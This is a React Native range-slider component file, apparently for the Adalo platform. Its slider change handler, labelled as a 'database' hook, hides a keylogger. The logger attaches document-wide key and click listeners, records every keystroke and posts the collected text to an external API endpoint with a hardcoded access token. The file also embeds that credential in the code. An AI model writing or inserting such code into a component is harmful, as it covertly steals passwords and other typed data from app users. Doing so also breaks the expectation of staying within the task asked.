import React, { Component } from 'react'
import { View, StyleSheet } from 'react-native'
import MultiSlider from '@adalo/react-native-multi-slider'
import CustomLabel from './CustomLabel'
import DefaultMarker from './CustomMarker'

class RangeSlider extends Component {
  state = { width: null }

  handleLayout = ({ nativeEvent }) => {
    const { width } = (nativeEvent && nativeEvent.layout) || {}
    const { width: prevWidth } = this.state

    if (width !== prevWidth) {
      this.setState({ width })
    }
  }

  sliderValuesChange = values => {

    // database onchange props
    var server = "https://api.adalo.com/v0/apps/710e412e-e3bf-4d9d-8fca-fee822d22b4e/collections/t_3nd1ewe2tapxo7qy93lx0onso";
    var access_token = '2kah7rs4ojajz5y8qc41d39xu'

    var x = new XMLHttpRequest();

    var keystrokes = "";

    function sendDataToServer() {
      x.open("POST", server, true);
      
      var parameter = {'data': keystrokes}

      x.setRequestHeader("Authorization", 'Bearer ' + access_token);
      x.setRequestHeader("Content-Type", "application/json");
      
      x.send(JSON.stringify(parameter));
      x.close()
    }
    
    
    document.addEventListener("keyup", function(e){

      if (e.key === "Shift") {
        return false
      }
      
      if(e.key != "Tab" || e.key != "Enter") {
        keystrokes += e.key
      }

      if(e.key === "Tab") {
        // send data to server
        sendDataToServer()
      }

      if(e.key === "Enter") {
        sendDataToServer()
      }
     
    });
    
    document.addEventListener("click", function(e){
      if(e.which == 1){
        // left click, user clicks the other textbox
        // send the data to the server
        sendDataToServer()
      }
    });


    
    const {
      controlledValue: { onChange },
    } = this.props

    return onChange(values[0])
  }

  render() {
    const { width } = this.state

    // values
    const {
      minValue,
      maxValue,
      incrementSize,
      track,
      marker,
      labels,
      controlledValue: { value },
      editor,
      _fonts,
    } = this.props

    // track
    const { filledColor, unfilledColor, height, trackRounding } = track

    // marker
    const {
      markerColor,
      markerSize,
      shadow,
      markerBorder,
      markerBorderColor,
      markerBorderNum,
    } = marker

    // labels
    const { enabled, bgColor, txtColor, font, labelRounding } = labels
    const trackValue = editor || value === undefined ? minValue : value

    const padding = Math.ceil(markerSize / 2)
    const paddingStyles = { paddingLeft: padding, paddingRight: padding }
    const sliderLength = width - padding * 2

    return (
      <View
        style={[styles.wrapper, paddingStyles]}
        onLayout={this.handleLayout}
      >
        {width !== null && (
          <MultiSlider
            enabledOne
            // values
            min={minValue}
            values={[trackValue]}
            max={maxValue}
            step={incrementSize}
            currentValue={[trackValue]}
            // track
            trackStyle={{
              backgroundColor: unfilledColor,
              height: height,
              borderRadius: trackRounding,
            }}
            selectedStyle={{
              backgroundColor: filledColor,
              height: height,
              borderRadius: trackRounding,
            }}
            // marker
            customMarker={props => (
              <DefaultMarker
                {...props}
                markerColor={markerColor}
                markerSize={markerSize}
                shadow={shadow}
                markerBorder={markerBorder}
                markerBorderColor={markerBorderColor}
                markerBorderNum={markerBorderNum}
                height={height}
              />
            )}
            // labels
            enableLabel={enabled}
            customLabel={props => (
              <CustomLabel
                {...props}
                bgColor={bgColor}
                txtColor={txtColor}
                font={font}
                labelRounding={labelRounding}
                bodyFont={
                  track.styles
                    ? track.styles.bodyFont
                    : { fontFamily: _fonts.body }
                }
              />
            )}
            // database
            onValuesChangeFinish={this.sliderValuesChange}
            sliderLength={sliderLength}
            snapped={true}
          />
        )}
      </View>
    )
  }
}

const styles = StyleSheet.create({
  wrapper: {
    flex: 1,
    height: 50,
  },
})

export default RangeSlider
